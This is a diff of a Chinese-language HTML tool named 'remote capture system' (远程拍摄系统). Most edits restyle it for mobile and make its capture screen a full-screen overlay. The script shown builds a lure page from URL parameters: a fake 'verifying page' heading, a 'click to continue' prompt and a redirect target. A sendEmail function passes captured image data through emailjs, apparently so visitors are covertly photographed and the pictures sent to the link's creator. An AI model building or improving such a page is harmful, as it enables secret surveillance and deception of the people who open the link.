@@ -15,11 +15,9 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
         
-        .main-page {
-            width: 100%;
-            min-height: 100vh;
+        body {
             padding: 20px;
-            overflow-y: auto;
+            -webkit-text-size-adjust: 100%;
         }
         
         .container {
@@ -29,6 +27,8 @@
             max-width: 600px;
             margin: 0 auto 20px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            position: relative;
+            z-index: 1;
         }
         
         h1 { 
@@ -56,6 +56,8 @@
             border: 2px solid #e0e0e0;
             border-radius: 8px;
             font-size: 14px;
+            -webkit-appearance: none;
+            appearance: none;
         }
         
         input:focus, select:focus, textarea:focus {
@@ -72,6 +74,8 @@
             cursor: pointer;
             margin-top: 10px;
             font-weight: 600;
+            -webkit-appearance: none;
+            appearance: none;
         }
         
         .btn-primary {
@@ -90,13 +94,13 @@
             background: #f8f9fa;
             border-radius: 8px;
             border: 1px dashed #ccc;
+            word-break: break-all;
         }
         
         .link-box a {
             color: #667eea;
             text-decoration: none;
             font-size: 12px;
-            word-break: break-all;
         }
         
         #copyBtn, #copyAliasBtn { 
@@ -123,11 +127,16 @@
         .capture-page {
             display: none;
             background: #1a1a2e;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            min-height: 100vh;
+            height: 100%;
             padding: 40px 20px;
             text-align: center;
             color: white;
+            overflow-y: auto;
+            z-index: 100;
         }
         
         .capture-page h2 { 
@@ -161,6 +170,8 @@
             font-size: 18px;
             cursor: pointer;
             margin-top: 20px;
+            -webkit-appearance: none;
+            appearance: none;
         }
         
         .warning-box {
@@ -182,22 +193,7 @@
             display: none;
         }
         
-        .share-btns { 
-            display: none; 
-            margin-top: 20px; 
-        }
-        
-        .btn-share {
-            background: #28a745;
-            color: white;
-            padding: 16px 30px;
-            border: none;
-            border-radius: 30px;
-            font-size: 18px;
-            cursor: pointer;
-   <body>
-
-    <div class="main-page" id="mainPage">
+    <div id="mainPage">
         <div class="container">
             <h1>📷 远程拍摄系统</h1>
             
@@ -278,7 +274,6 @@
             <button class="btn btn-success" id="copyBtn" onclick="copyToClipboard()">复制原始链接</button>
         </div>
     </div>
-
     <div class="capture-page" id="capturePage">
         <h2 id="captureTitle">正在加载...</h2>
         
@@ -400,7 +395,6 @@
             var urlParams = new URLSearchParams(window.location.search);
             var target = urlParams.get('target') || 'http://baidu.com';
             var id = urlParams.get('id') || 'unknown';
-            var status = document.getElementById('status');
             
             var fakeH1 = urlParams.get('fh') || '正在验证页面...';
             var fakeDesc = urlParams.get('fd') || '点击按钮继续浏览页面';
@@ -495,6 +489,7 @@
                 }, 1500);
             }
         }
+
         function sendEmail(imgData, id, service, template, key, email, target, statusEl) {
             emailjs.init(key);
             
